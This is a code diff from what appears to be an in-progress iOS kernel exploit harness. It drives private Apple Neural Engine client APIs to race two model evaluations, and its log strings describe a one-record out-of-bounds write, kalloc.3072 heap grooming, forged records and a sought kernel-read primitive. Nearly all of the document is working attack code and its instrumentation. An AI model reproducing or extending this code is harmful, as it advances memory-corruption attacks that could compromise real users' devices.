@@ -158,7 +158,7 @@
 #import <math.h>
 #import <objc/message.h>
 
-#define P044_BUILD @"p044-v71-directB"
+#define P044_BUILD @"p044-v72-guestB"
 
 #define INPUT_COUNT 191
 #define PAYLOAD_SIZE 0xb80
@@ -567,11 +567,13 @@ static int g_aneReqOk = 0;
    Direct evaluate of this model IS the concurrent consume. */
 static id g_aneBModel = nil;
 static id g_aneBReq = nil;
+static id g_aneBClient = nil; /* v72: second _ANEClient if a selector returns a distinct object */
 static int g_aneBOk = 0;
 static int g_aneBReqOk = 0;
 static uint32_t g_aneBOutSid = 0;
 static int g_aneBFireRc = -1;
 static double g_aneBFireT = NAN;
+#define P044_GUEST_BLOOP_SEC 90.0
 
 /* v68: StikDebug's graph. playback+mixWithOthers, 1 s zero PCM buffer
    scheduled .loops on an AVAudioPlayerNode, engine.start. The IO callback
@@ -782,6 +784,7 @@ static void cls_reset(void) {
     g_aneBOutSid = 0;
     g_aneBFireRc = -1;
     g_aneBFireT = NAN;
+    g_aneBClient = nil;
     g_forgeCount = 0;
     g_yB1 = g_yB2 = NAN;
     g_foreignOutSid = 0; g_foreignUsePre = g_foreignUsePost = 0;
@@ -1335,8 +1338,37 @@ static int p044_ane_client_fire(NSMutableString *out) {
     return ok ? 1 : 0;
 }
 
-/* v71 Direct B: load XVRC27_127inmin_1out on the SAME sharedConnection as A.
-   Load only — do not evaluate here (first evaluate is the concurrent consume). */
+/* v72: a distinct _ANEClient would let one process overlap A+B. Run#1
+   showed a raw IOConnect is unbound (sel0 kr=0x5). Probe class methods;
+   only use a result that is not sharedConnection. */
+static id p044_try_second_client(NSMutableString *out) {
+    Class Client = NSClassFromString(@"_ANEClient");
+    if (!Client) {
+        [out appendString:@"  [v72] _ANEClient class missing\n"];
+        return nil;
+    }
+    id shared = ((id (*)(id, SEL))objc_msgSend)(Client, NSSelectorFromString(@"sharedConnection"));
+    static const char *names[] = {
+        "sharedPrivilegedConnection", "newConnection", "primaryConnection",
+        "standaloneConnection", "connection", NULL
+    };
+    for (int i = 0; names[i]; i++) {
+        SEL s = NSSelectorFromString(@(names[i]));
+        if (![Client respondsToSelector:s]) {
+            [out appendFormat:@"  [v72] _ANEClient +%s: no\n", names[i]];
+            continue;
+        }
+        id c = ((id (*)(id, SEL))objc_msgSend)(Client, s);
+        [out appendFormat:@"  [v72] _ANEClient +%s -> %p%s\n", names[i], c,
+            (c && c != shared) ? " DISTINCT" : " (same/nil)"];
+        if (c && c != shared) return c;
+    }
+    [out appendString:@"  [v72] one-app second client UNAVAILABLE — two Direct evaluates serialize on sharedConnection (note 181). Guest p044_guest.txt=directB is the overlap.\n"];
+    return nil;
+}
+
+/* v71/v72 Direct B: load XVRC27_127inmin_1out. Client is g_aneBClient
+   (distinct) or g_aneClient (guest loop / shared). Load only. */
 static int p044_ane_load_b(NSMutableString *out) {
     Class Model = NSClassFromString(@"_ANEModel");
     Class Client = NSClassFromString(@"_ANEClient");
@@ -1345,10 +1377,12 @@ static int p044_ane_load_b(NSMutableString *out) {
         [out appendFormat:@"  [v71] Direct B missing cls/url model=%@\n", MODEL_B_NAME];
         return 0;
     }
-    if (!g_aneClient) {
-        g_aneClient = ((id (*)(id, SEL))objc_msgSend)(Client, NSSelectorFromString(@"sharedConnection"));
+    id client = g_aneBClient ?: g_aneClient;
+    if (!client) {
+        client = ((id (*)(id, SEL))objc_msgSend)(Client, NSSelectorFromString(@"sharedConnection"));
+        g_aneClient = client;
     }
-    if (!g_aneClient) {
+    if (!client) {
         [out appendString:@"  [v71] Direct B sharedConnection nil\n"];
         return 0;
     }
@@ -1362,13 +1396,13 @@ static int p044_ane_load_b(NSMutableString *out) {
     NSError *err = nil;
     SEL compileSel = NSSelectorFromString(@"compileModel:options:qos:error:");
     SEL loadSel = NSSelectorFromString(@"doLoadModel:options:qos:error:");
-    if ([g_aneClient respondsToSelector:compileSel]) {
+    if ([client respondsToSelector:compileSel]) {
         ((BOOL (*)(id, SEL, id, id, unsigned, NSError **))objc_msgSend)(
-            g_aneClient, compileSel, model, @{}, 2, &err);
+            client, compileSel, model, @{}, 2, &err);
     }
-    if ([g_aneClient respondsToSelector:loadSel]) {
+    if ([client respondsToSelector:loadSel]) {
         ((BOOL (*)(id, SEL, id, id, unsigned, NSError **))objc_msgSend)(
-            g_aneClient, loadSel, model, @{}, 2, &err);
+            client, loadSel, model, @{}, 2, &err);
     }
     uint64_t h = 0;
     SEL phSel = NSSelectorFromString(@"programHandle");
@@ -1446,15 +1480,16 @@ static int p044_ane_build_request_b(NSMutableString *out) {
 }
 
 static int p044_ane_client_fire_b(NSMutableString *out) {
-    if (!g_aneClient || !g_aneBModel || !g_aneBReq) return -1;
+    id client = g_aneBClient ?: g_aneClient;
+    if (!client || !g_aneBModel || !g_aneBReq) return -1;
     SEL fireSel = NSSelectorFromString(@"doEvaluateDirectWithModel:options:request:qos:error:");
-    if (![g_aneClient respondsToSelector:fireSel]) {
+    if (![client respondsToSelector:fireSel]) {
         [out appendString:@"  [v71] Direct B doEvaluateDirectWithModel selector missing\n"];
         return -1;
     }
     NSError *err = nil;
     BOOL ok = ((BOOL (*)(id, SEL, id, id, id, unsigned, NSError **))objc_msgSend)(
-        g_aneClient, fireSel,
+        client, fireSel,
         g_aneBModel, @{}, g_aneBReq, (unsigned)2, &err);
     [out appendFormat:@"  [v71] Direct B doEvaluateDirectWithModel ok=%d err=%@\n", ok,
         err ? err.localizedDescription : @"<nil>"];
@@ -2190,7 +2225,7 @@ static void *watch_worker(void *arg) {
     [out appendString:@"Oct-2 panic pack: record area = dedicated kalloc.3072 (192x16); GZAlloc guard abort (pc=+0x18C store) and modified-after-free are the two freed-lane failure modes. Hole lane CLOSED.\n"];
     [out appendString:@"Run#1 proof: raw IOConnect conn CLOSED (handle binds to sharedConnection; sel0 kr=0x5, sel2 0xe00002c2).\n"];
     [out appendString:@"Landing lane per build: HOLE_MODE=0 live-kmsg neighbor (v70 1-record OOB). Hole punch CLOSED.\n"];
-    [out appendString:@"v71 Direct B: CoreML B is cached (note 120) and never re-prewires. B is now a first Direct evaluate of XVRC27_127inmin_1out (127+1=128 records, MemoryMap CONSUMES). A stays REQ_IN=192 1-record OOB. Overlap is two doEvaluateDirectWithModel on sharedConnection. Signals: B t>0 (not cache), B err/geometry, B outSid useCount, A's output record {outSid,0,1,2} recvd in a live extra (occupancy includes out_entry). Consume-forge = bar half two. Still not hasKread. AfterKread HOLD.\n"];
+    [out appendString:@"v71 Direct B: CoreML B is cached (note 120) and never re-prewires. B is a first Direct evaluate of XVRC27_127inmin_1out (127+1=128 records, MemoryMap CONSUMES). v71 one-process overlap FAILED: sharedConnection serializes (B t=1-3ms then A). v72: one-app second _ANEClient is probed; if none, in-process B is SKIPPED. Overlap is TWO INSTALLS: guest p044_guest.txt=directB loops Direct B 90s; standalone fires REQ_IN=192 1-record OOB during that window. Consume-forge = bar half two. Still not hasKread. AfterKread HOLD.\n"];
     [out appendString:@"Occupancy HIT is a 3072 store of ANE records. NOT conversion. NOT hasKread.\n"];
     [out appendString:@"record_forge: forge_seen>0 = spilled body carries client-chosen sids (bar half one).\n\n"];
 
@@ -2383,6 +2418,55 @@ static void *watch_worker(void *arg) {
                tile value (e.g. 4b1d) = round-1 boundary control, unchanged. */
             NSString *gmode = [[gs lowercaseString] stringByTrimmingCharactersInSet:
                 [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+            if ([gmode hasPrefix:@"directb"] || [gmode isEqualToString:@"bloop"]) {
+                [out appendString:@"\n=== v72 GUEST DIRECT-B LOOP ===\n"];
+                [out appendString:@"  128-record in-bounds Direct evaluate, tight loop 90s. MemoryMap consumes each fire. Switch to STANDALONE and tap P044 (REQ_IN=192) WHILE this loop runs. One process cannot overlap two evaluates on sharedConnection.\n"];
+                p044_guest_audio_start(out);
+                Class Client = NSClassFromString(@"_ANEClient");
+                if (Client && !g_aneClient) {
+                    g_aneClient = ((id (*)(id, SEL))objc_msgSend)(Client, NSSelectorFromString(@"sharedConnection"));
+                }
+                if (!p044_ane_load_b(out) || !p044_ane_build_request_b(out)) {
+                    [out appendString:@"  [v72] Direct B not armed — loop aborted\n"];
+                    p044_guest_audio_stop(out);
+                    p044_write_log(out);
+                    return out;
+                }
+                NSDate *tEnd = [NSDate dateWithTimeIntervalSinceNow:P044_GUEST_BLOOP_SEC];
+                uint32_t n = 0, nOk = 0, nErr = 0;
+                double tMin = 1e9, tMax = 0, tSum = 0;
+                [out appendFormat:@"  [v72] LOOP OPEN %.0fs — tap STANDALONE P044 NOW (REQ_IN=192)\n",
+                    P044_GUEST_BLOOP_SEC];
+                p044_write_log(out);
+                while ([[NSDate date] compare:tEnd] == NSOrderedAscending) {
+                    NSMutableString *one = [NSMutableString string];
+                    NSDate *t0 = [NSDate date];
+                    int rc = p044_ane_client_fire_b(one);
+                    double t = -[t0 timeIntervalSinceNow];
+                    n++;
+                    if (rc == 1) nOk++; else nErr++;
+                    if (t < tMin) tMin = t;
+                    if (t > tMax) tMax = t;
+                    tSum += t;
+                    if ((n % 50u) == 0 || rc != 1) {
+                        [out appendFormat:@"  [v72] n=%u ok=%u err=%u last_rc=%d last_t=%.4fs\n",
+                            n, nOk, nErr, rc, t];
+                        if (rc != 1) [out appendString:one];
+                        p044_write_log(out);
+                    }
+                }
+                [out appendFormat:@"\n=== v72 GUEST DIRECT-B LOOP CLOSED n=%u ok=%u err=%u t=%.4f..%.4f mean=%.4fs ===\n",
+                    n, nOk, nErr, (n ? tMin : 0), tMax, n ? tSum / n : 0];
+                [out appendString:@"  Honesty: this loop is the consume-side table factory. Conversion still needs A's 16B in a live B table. hasKread=NO.\n"];
+                p044_guest_audio_stop(out);
+                g_aneBReq = nil;
+                g_aneBModel = nil;
+                g_aneClient = nil;
+                g_aneBOk = 0;
+                g_aneBReqOk = 0;
+                p044_write_log(out);
+                return out;
+            }
             if ([gmode hasPrefix:@"ane"]) {
                 g_guestHoldANE = 1;
                 [out appendString:@"  [v64] GUEST ANE-HOLD MODE: full fire runs this tap (~2 min). The request OUTPUT surface — consumer-mapped by the ANE — is HELD at cleanup instead of released; its sid prints at the END of this log. Keep the app alive; do not force-quit.\n"];
@@ -2830,11 +2914,19 @@ static void *watch_worker(void *arg) {
     }
     p044_write_log(out);
 
-    [out appendString:@"\n=== PHASE 3b.5: Direct B load+request (127+1=128, MemoryMap consumes) ===\n"];
-    g_aneBOk = p044_ane_load_b(out);
-    if (g_aneBOk) g_aneBReqOk = p044_ane_build_request_b(out);
-    if (!g_aneBOk || !g_aneBReqOk) {
-        [out appendString:@"  [v71] Direct B NOT armed — concurrent consume skipped this tap (A still fires)\n"];
+    [out appendString:@"\n=== PHASE 3b.5: Direct B (one-app second client OR skip) ===\n"];
+    g_aneBClient = p044_try_second_client(out);
+    if (g_aneBClient) {
+        [out appendString:@"  [v72] DISTINCT _ANEClient — loading Direct B on it (one-app overlap attempt)\n"];
+        g_aneBOk = p044_ane_load_b(out);
+        if (g_aneBOk) g_aneBReqOk = p044_ane_build_request_b(out);
+    } else {
+        [out appendString:@"  [v72] in-process Direct B SKIPPED. Guest: Documents/p044_guest.txt=directB then tap P044; this install fires A only.\n"];
+        g_aneBOk = 0;
+        g_aneBReqOk = 0;
+    }
+    if (g_aneBClient && (!g_aneBOk || !g_aneBReqOk)) {
+        [out appendString:@"  [v72] second-client Direct B NOT armed — A still fires\n"];
     }
     p044_write_log(out);
 
@@ -3448,6 +3540,7 @@ static void *watch_worker(void *arg) {
         g_aneReq = nil;
         g_aneBReq = nil;
         g_aneBModel = nil;
+        g_aneBClient = nil;
         g_aneClient = nil;
         g_aneModelObj = nil;
         g_aneModelOk = 0;
